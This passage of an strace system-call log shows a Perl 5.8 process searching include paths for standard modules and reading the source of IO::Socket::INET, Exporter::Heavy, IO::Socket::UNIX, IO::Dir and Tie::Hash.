}\n  }\n\n  if(defined $port) {\n    my $defport = ($port =~ s,\\((\\d+)\\)$,,) ? $1 : undef;\n    my $pnum = ($port =~ m,^(\\d+)$,)[0];\n\n    @serv = getservbyname($port, $proto[0] || \"\")\n\tif ($port =~ m,\\D,);\n\n    $port = $serv[2] || $defport || $pnum;\n    unless (defined $port) {\n\t$@ = \"Bad service \'$origport\'\";\n\treturn;\n    }\n\n    $proto = (getprotobyname($serv[3]))[2] || undef\n\tif @serv && !$proto;\n  }\n\n return ($addr || undef,\n\t $port || undef,\n\t $proto || undef\n\t);\n}\n\nsub _error {\n    my $sock = shift;\n    my $err = shift;\n    {\n      local($!);\n      my $title = ref($sock).\": \";\n      $@ = join(\"\", $_[0] =~ /^$title/ ? \"\" : $title, @_);\n      close($sock)\n\tif(defined fileno($sock));\n    }\n    $! = $err;\n    return undef;\n}\n\nsub _get_addr {\n    my($sock,$addr_str, $multi) = @_;\n    my @addr;\n    if ($multi && $addr_str !~ /^\\d+(?:\\.\\d+){3}$/) {\n\t(undef, undef, undef, undef, @addr) = gethostbyname($addr_str);\n    } else {\n\tmy $h = inet_aton($addr_str);\n\tpush(@addr, $h) if defined $h;\n    }\n    @addr;\n}\n\nsub configure {\n    my($sock,$arg) = @_;\n    my($lport,$rport,$laddr,$raddr,$proto,$type);\n\n    $arg->{LocalAddr} = $arg->{LocalHost}\n\tif exists $arg->{LocalHost} && !exists $arg->{LocalAddr};\n\n    ($laddr,$lport,$proto) = _sock_info($arg->{LocalAddr},\n\t\t\t\t\t$arg->{LocalPort},\n\t\t\t\t\t$arg->{Proto})\n\t\t\tor return _error($sock, $!, $@);\n\n    $laddr = defined $laddr ? inet_aton($laddr)\n\t\t\t    : INADDR_ANY;\n\n    return _error($sock, $EINVAL, \"Bad hostname \'\",$arg->{LocalAddr},\"\'\")\n\tunless(defined $laddr);\n\n    $arg->{PeerAddr} = $arg->{PeerHost}\n\tif exists $arg->{PeerHost} && !exists $arg->{PeerAddr};\n\n    unless(exists $arg->{Listen}) {\n\t($raddr,$rport,$proto) = _sock_info($arg->{PeerAddr},\n\t\t\t\t\t    $arg->{PeerPort},\n\t\t\t\t\t    $proto)\n\t\t\tor return _error($sock, $!, $@);\n    }\n\n    $proto ||= (getprotobyname(\'tcp\'))[2];\n\n    my $pname = (getprotobynumber($proto))[0];\n    $type = $arg->{Type} || $socket_type{lc $pname};\n\n    my @raddr = ();\n\n    if(defined $raddr) {\n\t@raddr = $sock->_get_addr($raddr, $arg->{MultiHomed});\n\treturn _error($sock, $EINVAL, \"Bad hostname \'\",$arg->{PeerAddr},\"\'\")\n\t    unless @raddr;\n    }\n\n    while(1) {\n\n\t$sock->socket(AF_INET, $type, $proto) or\n\t    return _error($sock, $!, \"$!\");\n\n        if (defined $arg->{Blocking}) {\n\t    defined $sock->blocking($arg->{Blocking})\n\t\tor return _error($sock, $!, \"$!\");\n\t}\n\n\tif ($arg->{Reuse} || $arg->{ReuseAddr}) {\n\t    $sock->sockopt(SO_REUSEADDR,1) or\n\t\t    return _error($sock, $!, \"$!\");\n\t}\n\n\tif ($arg->{ReusePort}) {\n\t    $sock->sockopt(SO_REUSEPORT,1) or\n\t\t    return _error($sock, $!, \"$!\");\n\t}\n\n\tif ($arg->{Broadcast}) {\n\t\t$sock->sockopt(SO_BROADCAST,1) or\n\t\t    return _error($sock, $!, \"$!\");\n\t}\n\n\tif($lport || ($laddr ne INADDR_ANY) || exists $arg->{Listen}) {\n\t    $sock->bind($lport || 0, $laddr) or\n\t\t    return _error($sock, $!, \"$!\");\n\t}\n\n\tif(exists $arg->{Listen}) {\n\t    $sock->listen($arg->{Listen} || 5) or\n\t\treturn _error($sock, $!, \"$!\");\n\t    last;\n\t}\n\n \t# don\'t try to connect unless we\'re given a PeerAddr\n \tlast unless e", 4096) = 4096
10890 07:35:08.691232 stat64("/etc/perl/Exporter/Heavy.pmc", 0xbfbc046c) = -1 ENOENT (No such file or directory)
10890 07:35:08.691248 stat64("/etc/perl/Exporter/Heavy.pm", 0xbfbc037c) = -1 ENOENT (No such file or directory)
10890 07:35:08.691261 stat64("/usr/local/lib/perl/5.8.8/Exporter/Heavy.pmc", 0xbfbc046c) = -1 ENOENT (No such file or directory)
10890 07:35:08.691274 stat64("/usr/local/lib/perl/5.8.8/Exporter/Heavy.pm", 0xbfbc037c) = -1 ENOENT (No such file or directory)
10890 07:35:08.691288 stat64("/usr/local/share/perl/5.8.8/Exporter/Heavy.pmc", 0xbfbc046c) = -1 ENOENT (No such file or directory)
10890 07:35:08.691301 stat64("/usr/local/share/perl/5.8.8/Exporter/Heavy.pm", 0xbfbc037c) = -1 ENOENT (No such file or directory)
10890 07:35:08.691315 stat64("/usr/lib/perl5/Exporter/Heavy.pmc", 0xbfbc046c) = -1 ENOENT (No such file or directory)
10890 07:35:08.691327 stat64("/usr/lib/perl5/Exporter/Heavy.pm", 0xbfbc037c) = -1 ENOENT (No such file or directory)
10890 07:35:08.691340 stat64("/usr/share/perl5/Exporter/Heavy.pmc", 0xbfbc046c) = -1 ENOENT (No such file or directory)
10890 07:35:08.691352 stat64("/usr/share/perl5/Exporter/Heavy.pm", 0xbfbc037c) = -1 ENOENT (No such file or directory)
10890 07:35:08.691365 stat64("/usr/lib/perl/5.8/Exporter/Heavy.pmc", 0xbfbc046c) = -1 ENOENT (No such file or directory)
10890 07:35:08.691378 stat64("/usr/lib/perl/5.8/Exporter/Heavy.pm", 0xbfbc037c) = -1 ENOENT (No such file or directory)
10890 07:35:08.691392 stat64("/usr/share/perl/5.8/Exporter/Heavy.pmc", 0xbfbc046c) = -1 ENOENT (No such file or directory)
10890 07:35:08.691405 stat64("/usr/share/perl/5.8/Exporter/Heavy.pm", {st_mode=S_IFREG|0644, st_size=6252, ...}) = 0
10890 07:35:08.691426 open("/usr/share/perl/5.8/Exporter/Heavy.pm", O_RDONLY|O_LARGEFILE) = 8
10890 07:35:08.691441 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfbc0188) = -1 ENOTTY (Inappropriate ioctl for device)
10890 07:35:08.691452 _llseek(8, 0, [0], SEEK_CUR) = 0
10890 07:35:08.691470 read(8, "package Exporter::Heavy;\n\nuse strict;\nno strict \'refs\';\n\n# On one line so MakeMaker will see it.\nrequire Exporter;  our $VERSION = $Exporter::VERSION;\n$Carp::Internal{\"Exporter::Heavy\"} = 1;\n\n#\n# We go to a lot of trouble not to \'require Carp\' at file scope,\n#  because Carp requires Exporter, and something has to give.\n#\n\nsub _rebuild_cache {\n    my ($pkg, $exports, $cache) = @_;\n    s/^&// foreach @$exports;\n    @{$cache}{@$exports} = (1) x @$exports;\n    my $ok = \\@{\"${pkg}::EXPORT_OK\"};\n    if (@$ok) {\n\ts/^&// foreach @$ok;\n\t@{$cache}{@$ok} = (1) x @$ok;\n    }\n}\n\nsub heavy_export {\n\n    # First make import warnings look like they\'re coming from the \"use\".\n    local $SIG{__WARN__} = sub {\n\tmy $text = shift;\n\tif ($text =~ s/ at \\S*Exporter\\S*.pm line \\d+.*\\n//) {\n\t    require Carp;\n\t    local $Carp::CarpLevel = 1;\t# ignore package calling us too.\n\t    Carp::carp($text);\n\t}\n\telse {\n\t    warn $text;\n\t}\n    };\n    local $SIG{__DIE__} = sub {\n\trequire Carp;\n\tlocal $Carp::CarpLevel = 1;\t# ignore package calling us too.\n\tCarp::croak(\"$_[0]Illegal null symbol in \\@${1}::EXPORT\")\n\t    if $_[0] =~ /^Unable to create sub named \"(.*?)::\"/;\n    };\n\n    my($pkg, $callpkg, @imports) = @_;\n    my($type, $sym, $cache_is_current, $oops);\n    my($exports, $export_cache) = (\\@{\"${pkg}::EXPORT\"},\n                                   $Exporter::Cache{$pkg} ||= {});\n\n    if (@imports) {\n\tif (!%$export_cache) {\n\t    _rebuild_cache ($pkg, $exports, $export_cache);\n\t    $cache_is_current = 1;\n\t}\n\n\tif (grep m{^[/!:]}, @imports) {\n\t    my $tagsref = \\%{\"${pkg}::EXPORT_TAGS\"};\n\t    my $tagdata;\n\t    my %imports;\n\t    my($remove, $spec, @names, @allexports);\n\t    # negated first item implies starting with default set:\n\t    unshift @imports, \':DEFAULT\' if $imports[0] =~ m/^!/;\n\t    foreach $spec (@imports){\n\t\t$remove = $spec =~ s/^!//;\n\n\t\tif ($spec =~ s/^://){\n\t\t    if ($spec eq \'DEFAULT\'){\n\t\t\t@names = @$exports;\n\t\t    }\n\t\t    elsif ($tagdata = $tagsref->{$spec}) {\n\t\t\t@names = @$tagdata;\n\t\t    }\n\t\t    else {\n\t\t\twarn qq[\"$spec\" is not defined in %${pkg}::EXPORT_TAGS];\n\t\t\t++$oops;\n\t\t\tnext;\n\t\t    }\n\t\t}\n\t\telsif ($spec =~ m:^/(.*)/$:){\n\t\t    my $patn = $1;\n\t\t    @allexports = keys %$export_cache unless @allexports; # only do keys once\n\t\t    @names = grep(/$patn/, @allexports); # not anchored by default\n\t\t}\n\t\telse {\n\t\t    @names = ($spec); # is a normal symbol name\n\t\t}\n\n\t\twarn \"Import \".($remove ? \"del\":\"add\").\": @names \"\n\t\t    if $Exporter::Verbose;\n\n\t\tif ($remove) {\n\t\t   foreach $sym (@names) { delete $imports{$sym} } \n\t\t}\n\t\telse {\n\t\t    @imports{@names} = (1) x @names;\n\t\t}\n\t    }\n\t    @imports = keys %imports;\n\t}\n\n        my @carp;\n\tforeach $sym (@imports) {\n\t    if (!$export_cache->{$sym}) {\n\t\tif ($sym =~ m/^\\d/) {\n\t\t    $pkg->VERSION($sym); # inherit from UNIVERSAL\n\t\t    # If the version number was the only thing specified\n\t\t    # then we should act as if nothing was specified:\n\t\t    if (@imports == 1) {\n\t\t\t@imports = @$exports;\n\t\t\tlast;\n\t\t    }\n\t\t    # We need a way to emulate \'use Foo ()\' but still\n\t\t    # allow an easy version check: \"use Foo 1.23, \'\'\";\n\t\t    if (@imports == 2 and !$imports[1]) {\n\t\t\t@imports = ();\n\t\t\tlast;\n\t\t    }\n\t\t} elsif ($sym !~ s/^&// || !$export_cache->{$sym}) {\n\t\t    # Last chance - see if they\'ve updated EXPORT_OK since we\n\t\t    # cached it.\n\n\t\t    unless ($cache_is_current) {\n\t\t\t%$export_cache = ();\n\t\t\t_rebuild_cache ($pkg, $exports, $export_cache);\n\t\t\t$cache_is_current = 1;\n\t\t    }\n\n\t\t    if (!$export_cache->{$sym}) {\n\t\t\t# accumulate the non-exports\n\t\t\tpush @carp,\n\t\t\t  qq[\"$sym\" is not exported by the $pkg module\\n];\n\t\t\t$oops++;\n\t\t    }\n\t\t}\n\t    }\n\t}\n\tif ($oops) {\n\t    require Carp;\n\t    Carp::croak(\"@{carp}Can\'t continue after import errors\");\n\t}\n    }\n    else {\n\t@imports = @$exports;\n    }\n\n    my($fail, $fail_cache) = (\\@{\"${pkg}::EXPORT_FAIL\"},\n                              $Exporter::FailCache{$pkg} ||= {});\n\n    if (@$fail) {\n\tif (!%$fail_cache) {\n\t    # Build cache of symbols. Optimise the lookup by adding\n\t    # barewords twice... both with and without a leading &.\n\t    # (Technique could be applied to $export_cac", 4096) = 4096
10890 07:35:08.692241 read(8, "he at cost of memory)\n\t    my @expanded = map { /^\\w/ ? ($_, \'&\'.$_) : $_ } @$fail;\n\t    warn \"${pkg}::EXPORT_FAIL cached: @expanded\" if $Exporter::Verbose;\n\t    @{$fail_cache}{@expanded} = (1) x @expanded;\n\t}\n\tmy @failed;\n\tforeach $sym (@imports) { push(@failed, $sym) if $fail_cache->{$sym} }\n\tif (@failed) {\n\t    @failed = $pkg->export_fail(@failed);\n\t    foreach $sym (@failed) {\n                require Carp;\n\t\tCarp::carp(qq[\"$sym\" is not implemented by the $pkg module ],\n\t\t\t\"on this architecture\");\n\t    }\n\t    if (@failed) {\n\t\trequire Carp;\n\t\tCarp::croak(\"Can\'t continue after import errors\");\n\t    }\n\t}\n    }\n\n    warn \"Importing into $callpkg from $pkg: \",\n\t\tjoin(\", \",sort @imports) if $Exporter::Verbose;\n\n    foreach $sym (@imports) {\n\t# shortcut for the common case of no type character\n\t(*{\"${callpkg}::$sym\"} = \\&{\"${pkg}::$sym\"}, next)\n\t    unless $sym =~ s/^(\\W)//;\n\t$type = $1;\n\t*{\"${callpkg}::$sym\"} =\n\t    $type eq \'&\' ? \\&{\"${pkg}::$sym\"} :\n\t    $type eq \'$\' ? \\${\"${pkg}::$sym\"} :\n\t    $type eq \'@\' ? \\@{\"${pkg}::$sym\"} :\n\t    $type eq \'%\' ? \\%{\"${pkg}::$sym\"} :\n\t    $type eq \'*\' ?  *{\"${pkg}::$sym\"} :\n\t    do { require Carp; Carp::croak(\"Can\'t export symbol: $type$sym\") };\n    }\n}\n\nsub heavy_export_to_level\n{\n      my $pkg = shift;\n      my $level = shift;\n      (undef) = shift;\t\t\t# XXX redundant arg\n      my $callpkg = caller($level);\n      $pkg->export($callpkg, @_);\n}\n\n# Utility functions\n\nsub _push_tags {\n    my($pkg, $var, $syms) = @_;\n    my @nontag = ();\n    my $export_tags = \\%{\"${pkg}::EXPORT_TAGS\"};\n    push(@{\"${pkg}::$var\"},\n\tmap { $export_tags->{$_} ? @{$export_tags->{$_}} \n                                 : scalar(push(@nontag,$_),$_) }\n\t\t(@$syms) ? @$syms : keys %$export_tags);\n    if (@nontag and $^W) {\n\t# This may change to a die one day\n\trequire Carp;\n\tCarp::carp(join(\", \", @nontag).\" are not tags of $pkg\");\n    }\n}\n\nsub heavy_require_version {\n    my($self, $wanted) = @_;\n    my $pkg = ref $self || $self;\n    return ${pkg}->VERSION($wanted);\n}\n\nsub heavy_export_tags {\n  _push_tags((caller)[0], \"EXPORT\",    \\@_);\n}\n\nsub heavy_export_ok_tags {\n  _push_tags((caller)[0], \"EXPORT_OK\", \\@_);\n}\n\n1;\n", 4096) = 2156
10890 07:35:08.692443 brk(0x829c000)    = 0x829c000
10890 07:35:08.692762 read(8, "", 4096) = 0
10890 07:35:08.692779 close(8)          = 0
10890 07:35:08.693824 read(5, "xists($arg->{PeerAddr});\n \n        $raddr = shift @raddr;\n\n\treturn _error($sock, $EINVAL, \'Cannot determine remote port\')\n\t\tunless($rport || $type == SOCK_DGRAM || $type == SOCK_RAW);\n\n\tlast\n\t    unless($type == SOCK_STREAM || defined $raddr);\n\n\treturn _error($sock, $EINVAL, \"Bad hostname \'\",$arg->{PeerAddr},\"\'\")\n\t    unless defined $raddr;\n\n#        my $timeout = ${*$sock}{\'io_socket_timeout\'};\n#        my $before = time() if $timeout;\n\n\tundef $@;\n        if ($sock->connect(pack_sockaddr_in($rport, $raddr))) {\n#            ${*$sock}{\'io_socket_timeout\'} = $timeout;\n            return $sock;\n        }\n\n\treturn _error($sock, $!, $@ || \"Timeout\")\n\t    unless @raddr;\n\n#\tif ($timeout) {\n#\t    my $new_timeout = $timeout - (time() - $before);\n#\t    return _error($sock,\n#                         (exists(&Errno::ETIMEDOUT) ? Errno::ETIMEDOUT() : $EINVAL),\n#                         \"Timeout\") if $new_timeout <= 0;\n#\t    ${*$sock}{\'io_socket_timeout\'} = $new_timeout;\n#        }\n\n    }\n\n    $sock;\n}\n\nsub connect {\n    @_ == 2 || @_ == 3 or\n       croak \'usage: $sock->connect(NAME) or $sock->connect(PORT, ADDR)\';\n    my $sock = shift;\n    return $sock->SUPER::connect(@_ == 1 ? shift : pack_sockaddr_in(@_));\n}\n\nsub bind {\n    @_ == 2 || @_ == 3 or\n       croak \'usage: $sock->bind(NAME) or $sock->bind(PORT, ADDR)\';\n    my $sock = shift;\n    return $sock->SUPER::bind(@_ == 1 ? shift : pack_sockaddr_in(@_))\n}\n\nsub sockaddr {\n    @_ == 1 or croak \'usage: $sock->sockaddr()\';\n    my($sock) = @_;\n    my $name = $sock->sockname;\n    $name ? (sockaddr_in($name))[1] : undef;\n}\n\nsub sockport {\n    @_ == 1 or croak \'usage: $sock->sockport()\';\n    my($sock) = @_;\n    my $name = $sock->sockname;\n    $name ? (sockaddr_in($name))[0] : undef;\n}\n\nsub sockhost {\n    @_ == 1 or croak \'usage: $sock->sockhost()\';\n    my($sock) = @_;\n    my $addr = $sock->sockaddr;\n    $addr ? inet_ntoa($addr) : undef;\n}\n\nsub peeraddr {\n    @_ == 1 or croak \'usage: $sock->peeraddr()\';\n    my($sock) = @_;\n    my $name = $sock->peername;\n    $name ? (sockaddr_in($name))[1] : undef;\n}\n\nsub peerport {\n    @_ == 1 or croak \'usage: $sock->peerport()\';\n    my($sock) = @_;\n    my $name = $sock->peername;\n    $name ? (sockaddr_in($name))[0] : undef;\n}\n\nsub peerhost {\n    @_ == 1 or croak \'usage: $sock->peerhost()\';\n    my($sock) = @_;\n    my $addr = $sock->peeraddr;\n    $addr ? inet_ntoa($addr) : undef;\n}\n\n1;\n\n__END__\n\n", 4096) = 2401
10890 07:35:08.694282 _llseek(5, 6496, [6496], SEEK_SET) = 0
10890 07:35:08.694305 _llseek(5, 0, [6496], SEEK_CUR) = 0
10890 07:35:08.694316 close(5)          = 0
10890 07:35:08.694377 stat64("/etc/perl/IO/Socket/UNIX.pmc", 0xbfbc091c) = -1 ENOENT (No such file or directory)
10890 07:35:08.694393 stat64("/etc/perl/IO/Socket/UNIX.pm", 0xbfbc082c) = -1 ENOENT (No such file or directory)
10890 07:35:08.694407 stat64("/usr/local/lib/perl/5.8.8/IO/Socket/UNIX.pmc", 0xbfbc091c) = -1 ENOENT (No such file or directory)
10890 07:35:08.694421 stat64("/usr/local/lib/perl/5.8.8/IO/Socket/UNIX.pm", 0xbfbc082c) = -1 ENOENT (No such file or directory)
10890 07:35:08.694444 stat64("/usr/local/share/perl/5.8.8/IO/Socket/UNIX.pmc", 0xbfbc091c) = -1 ENOENT (No such file or directory)
10890 07:35:08.694459 stat64("/usr/local/share/perl/5.8.8/IO/Socket/UNIX.pm", 0xbfbc082c) = -1 ENOENT (No such file or directory)
10890 07:35:08.694474 stat64("/usr/lib/perl5/IO/Socket/UNIX.pmc", 0xbfbc091c) = -1 ENOENT (No such file or directory)
10890 07:35:08.694486 stat64("/usr/lib/perl5/IO/Socket/UNIX.pm", 0xbfbc082c) = -1 ENOENT (No such file or directory)
10890 07:35:08.694500 stat64("/usr/share/perl5/IO/Socket/UNIX.pmc", 0xbfbc091c) = -1 ENOENT (No such file or directory)
10890 07:35:08.694512 stat64("/usr/share/perl5/IO/Socket/UNIX.pm", 0xbfbc082c) = -1 ENOENT (No such file or directory)
10890 07:35:08.694526 stat64("/usr/lib/perl/5.8/IO/Socket/UNIX.pmc", 0xbfbc091c) = -1 ENOENT (No such file or directory)
10890 07:35:08.694539 stat64("/usr/lib/perl/5.8/IO/Socket/UNIX.pm", {st_mode=S_IFREG|0644, st_size=1387, ...}) = 0
10890 07:35:08.694561 open("/usr/lib/perl/5.8/IO/Socket/UNIX.pm", O_RDONLY|O_LARGEFILE) = 5
10890 07:35:08.694577 ioctl(5, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfbc0638) = -1 ENOTTY (Inappropriate ioctl for device)
10890 07:35:08.694589 _llseek(5, 0, [0], SEEK_CUR) = 0
10890 07:35:08.694605 brk(0x82bd000)    = 0x82bd000
10890 07:35:08.694622 read(5, "# IO::Socket::UNIX.pm\n#\n# Copyright (c) 1997-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Socket::UNIX;\n\nuse strict;\nour(@ISA, $VERSION);\nuse IO::Socket;\nuse Socket;\nuse Carp;\n\n@ISA = qw(IO::Socket);\n$VERSION = \"1.22\";\n$VERSION = eval $VERSION;\n\nIO::Socket::UNIX->register_domain( AF_UNIX );\n\nsub new {\n    my $class = shift;\n    unshift(@_, \"Peer\") if @_ == 1;\n    return $class->SUPER::new(@_);\n}\n\nsub configure {\n    my($sock,$arg) = @_;\n    my($bport,$cport);\n\n    my $type = $arg->{Type} || SOCK_STREAM;\n\n    $sock->socket(AF_UNIX, $type, 0) or\n\treturn undef;\n\n    if(exists $arg->{Local}) {\n\tmy $addr = sockaddr_un($arg->{Local});\n\t$sock->bind($addr) or\n\t    return undef;\n    }\n    if(exists $arg->{Listen} && $type != SOCK_DGRAM) {\n\t$sock->listen($arg->{Listen} || 5) or\n\t    return undef;\n    }\n    elsif(exists $arg->{Peer}) {\n\tmy $addr = sockaddr_un($arg->{Peer});\n\t$sock->connect($addr) or\n\t    return undef;\n    }\n\n    $sock;\n}\n\nsub hostpath {\n    @_ == 1 or croak \'usage: $sock->hostpath()\';\n    my $n = $_[0]->sockname || return undef;\n    (sockaddr_un($n))[0];\n}\n\nsub peerpath {\n    @_ == 1 or croak \'usage: $sock->peerpath()\';\n    my $n = $_[0]->peername || return undef;\n    (sockaddr_un($n))[0];\n}\n\n1; # Keep require happy\n\n__END__\n\n", 4096) = 1387
10890 07:35:08.695508 _llseek(5, 1386, [1386], SEEK_SET) = 0
10890 07:35:08.695527 _llseek(5, 0, [1386], SEEK_CUR) = 0
10890 07:35:08.695537 close(5)          = 0
10890 07:35:08.695593 stat64("/etc/perl/IO/Dir.pmc", 0xbfbc091c) = -1 ENOENT (No such file or directory)
10890 07:35:08.695609 stat64("/etc/perl/IO/Dir.pm", 0xbfbc082c) = -1 ENOENT (No such file or directory)
10890 07:35:08.695623 stat64("/usr/local/lib/perl/5.8.8/IO/Dir.pmc", 0xbfbc091c) = -1 ENOENT (No such file or directory)
10890 07:35:08.695636 stat64("/usr/local/lib/perl/5.8.8/IO/Dir.pm", 0xbfbc082c) = -1 ENOENT (No such file or directory)
10890 07:35:08.695649 stat64("/usr/local/share/perl/5.8.8/IO/Dir.pmc", 0xbfbc091c) = -1 ENOENT (No such file or directory)
10890 07:35:08.695662 stat64("/usr/local/share/perl/5.8.8/IO/Dir.pm", 0xbfbc082c) = -1 ENOENT (No such file or directory)
10890 07:35:08.695676 stat64("/usr/lib/perl5/IO/Dir.pmc", 0xbfbc091c) = -1 ENOENT (No such file or directory)
10890 07:35:08.695688 stat64("/usr/lib/perl5/IO/Dir.pm", 0xbfbc082c) = -1 ENOENT (No such file or directory)
10890 07:35:08.695701 stat64("/usr/share/perl5/IO/Dir.pmc", 0xbfbc091c) = -1 ENOENT (No such file or directory)
10890 07:35:08.695713 stat64("/usr/share/perl5/IO/Dir.pm", 0xbfbc082c) = -1 ENOENT (No such file or directory)
10890 07:35:08.695726 stat64("/usr/lib/perl/5.8/IO/Dir.pmc", 0xbfbc091c) = -1 ENOENT (No such file or directory)
10890 07:35:08.695739 stat64("/usr/lib/perl/5.8/IO/Dir.pm", {st_mode=S_IFREG|0644, st_size=5318, ...}) = 0
10890 07:35:08.695760 open("/usr/lib/perl/5.8/IO/Dir.pm", O_RDONLY|O_LARGEFILE) = 5
10890 07:35:08.695774 ioctl(5, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfbc0638) = -1 ENOTTY (Inappropriate ioctl for device)
10890 07:35:08.695786 _llseek(5, 0, [0], SEEK_CUR) = 0
10890 07:35:08.695806 read(5, "# IO::Dir.pm\n#\n# Copyright (c) 1997-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Dir;\n\nuse 5.006;\n\nuse strict;\nuse Carp;\nuse Symbol;\nuse Exporter;\nuse IO::File;\nour(@ISA, $VERSION, @EXPORT_OK);\nuse Tie::Hash;\nuse File::stat;\nuse File::Spec;\n\n@ISA = qw(Tie::Hash Exporter);\n$VERSION = \"1.05\";\n$VERSION = eval $VERSION;\n@EXPORT_OK = qw(DIR_UNLINK);\n\nsub DIR_UNLINK () { 1 }\n\nsub new {\n    @_ >= 1 && @_ <= 2 or croak \'usage: new IO::Dir [DIRNAME]\';\n    my $class = shift;\n    my $dh = gensym;\n    if (@_) {\n\tIO::Dir::open($dh, $_[0])\n\t    or return undef;\n    }\n    bless $dh, $class;\n}\n\nsub DESTROY {\n    my ($dh) = @_;\n    closedir($dh);\n}\n\nsub open {\n    @_ == 2 or croak \'usage: $dh->open(DIRNAME)\';\n    my ($dh, $dirname) = @_;\n    return undef\n\tunless opendir($dh, $dirname);\n    # a dir name should always have a \":\" in it; assume dirname is\n    # in current directory\n    $dirname = \':\' .  $dirname if ( ($^O eq \'MacOS\') && ($dirname !~ /:/) );\n    ${*$dh}{io_dir_path} = $dirname;\n    1;\n}\n\nsub close {\n    @_ == 1 or croak \'usage: $dh->close()\';\n    my ($dh) = @_;\n    closedir($dh);\n}\n\nsub read {\n    @_ == 1 or croak \'usage: $dh->read()\';\n    my ($dh) = @_;\n    readdir($dh);\n}\n\nsub seek {\n    @_ == 2 or croak \'usage: $dh->seek(POS)\';\n    my ($dh,$pos) = @_;\n    seekdir($dh,$pos);\n}\n\nsub tell {\n    @_ == 1 or croak \'usage: $dh->tell()\';\n    my ($dh) = @_;\n    telldir($dh);\n}\n\nsub rewind {\n    @_ == 1 or croak \'usage: $dh->rewind()\';\n    my ($dh) = @_;\n    rewinddir($dh);\n}\n\nsub TIEHASH {\n    my($class,$dir,$options) = @_;\n\n    my $dh = $class->new($dir)\n\tor return undef;\n\n    $options ||= 0;\n\n    ${*$dh}{io_dir_unlink} = $options & DIR_UNLINK;\n    $dh;\n}\n\nsub FIRSTKEY {\n    my($dh) = @_;\n    $dh->rewind;\n    scalar $dh->read;\n}\n\nsub NEXTKEY {\n    my($dh) = @_;\n    scalar $dh->read;\n}\n\nsub EXISTS {\n    my($dh,$key) = @_;\n    -e File::Spec->catfile(${*$dh}{io_dir_path}, $key);\n}\n\nsub FETCH {\n    my($dh,$key) = @_;\n    &lstat(File::Spec->catfile(${*$dh}{io_dir_path}, $key));\n}\n\nsub STORE {\n    my($dh,$key,$data) = @_;\n    my($atime,$mtime) = ref($data) ? @$data : ($data,$data);\n    my $file = File::Spec->catfile(${*$dh}{io_dir_path}, $key);\n    unless(-e $file) {\n\tmy $io = IO::File->new($file,O_CREAT | O_RDWR);\n\t$io->close if $io;\n    }\n    utime($atime,$mtime, $file);\n}\n\nsub DELETE {\n    my($dh,$key) = @_;\n\n    # Only unlink if unlink-ing is enabled\n    return 0\n\tunless ${*$dh}{io_dir_unlink};\n\n    my $file = File::Spec->catfile(${*$dh}{io_dir_path}, $key);\n\n    -d $file\n\t? rmdir($file)\n\t: unlink($file);\n}\n\n1;\n\n__END__\n\n=head1 NAME \n\nIO::Dir - supply object methods for directory handles\n\n=head1 SYNOPSIS\n\n    use IO::Dir;\n    $d = IO::Dir->new(\".\");\n    if (defined $d) {\n        while (defined($_ = $d->read)) { something($_); }\n        $d->rewind;\n        while (defined($_ = $d->read)) { something_else($_); }\n        undef $d;\n    }\n\n    tie %dir, \'IO::Dir\', \".\";\n    foreach (keys %dir) {\n\tprint $_, \" \" , $dir{$_}->size,\"\\n\";\n    }\n\n=head1 DESCRIPTION\n\nThe C<IO::Dir> package provides two interfaces to perl\'s directory reading\nroutines.\n\nThe first interface is an object approach. C<IO::Dir> provides an object\nconstructor and methods, which are just wrappers around perl\'s built in\ndirectory reading routines.\n\n=over 4\n\n=item new ( [ DIRNAME ] )\n\nC<new> is the constructor for C<IO::Dir> objects. It accepts one optional\nargument which,  if given, C<new> will pass to C<open>\n\n=back\n\nThe following methods are wrappers for the directory related functions built\ninto perl (the trailing `dir\' has been removed from the names). See L<perlfunc>\nfor details of these functions.\n\n=over 4\n\n=item open ( DIRNAME )\n\n=item read ()\n\n=item seek ( POS )\n\n=item tell ()\n\n=item rewind ()\n\n=item close ()\n\n=back\n\nC<IO::Dir> also provides an interface to reading directories via a tied\nhash. The tied hash extends the interface beyond just the directory\nreading routines by the use of C<lstat>, from the C<File::stat> package,\nC<unlin", 4096) = 4096
10890 07:35:08.696301 stat64("/etc/perl/Tie/Hash.pmc", 0xbfbc046c) = -1 ENOENT (No such file or directory)
10890 07:35:08.696319 stat64("/etc/perl/Tie/Hash.pm", 0xbfbc037c) = -1 ENOENT (No such file or directory)
10890 07:35:08.696333 stat64("/usr/local/lib/perl/5.8.8/Tie/Hash.pmc", 0xbfbc046c) = -1 ENOENT (No such file or directory)
10890 07:35:08.696345 stat64("/usr/local/lib/perl/5.8.8/Tie/Hash.pm", 0xbfbc037c) = -1 ENOENT (No such file or directory)
10890 07:35:08.696359 stat64("/usr/local/share/perl/5.8.8/Tie/Hash.pmc", 0xbfbc046c) = -1 ENOENT (No such file or directory)
10890 07:35:08.696372 stat64("/usr/local/share/perl/5.8.8/Tie/Hash.pm", 0xbfbc037c) = -1 ENOENT (No such file or directory)
10890 07:35:08.696387 stat64("/usr/lib/perl5/Tie/Hash.pmc", 0xbfbc046c) = -1 ENOENT (No such file or directory)
10890 07:35:08.696399 stat64("/usr/lib/perl5/Tie/Hash.pm", 0xbfbc037c) = -1 ENOENT (No such file or directory)
10890 07:35:08.696412 stat64("/usr/share/perl5/Tie/Hash.pmc", 0xbfbc046c) = -1 ENOENT (No such file or directory)
10890 07:35:08.696424 stat64("/usr/share/perl5/Tie/Hash.pm", 0xbfbc037c) = -1 ENOENT (No such file or directory)
10890 07:35:08.696437 stat64("/usr/lib/perl/5.8/Tie/Hash.pmc", 0xbfbc046c) = -1 ENOENT (No such file or directory)
10890 07:35:08.696450 stat64("/usr/lib/perl/5.8/Tie/Hash.pm", 0xbfbc037c) = -1 ENOENT (No such file or directory)
10890 07:35:08.696473 stat64("/usr/share/perl/5.8/Tie/Hash.pmc", 0xbfbc046c) = -1 ENOENT (No such file or directory)
10890 07:35:08.696486 stat64("/usr/share/perl/5.8/Tie/Hash.pm", {st_mode=S_IFREG|0644, st_size=7304, ...}) = 0
10890 07:35:08.696508 open("/usr/share/perl/5.8/Tie/Hash.pm", O_RDONLY|O_LARGEFILE) = 8
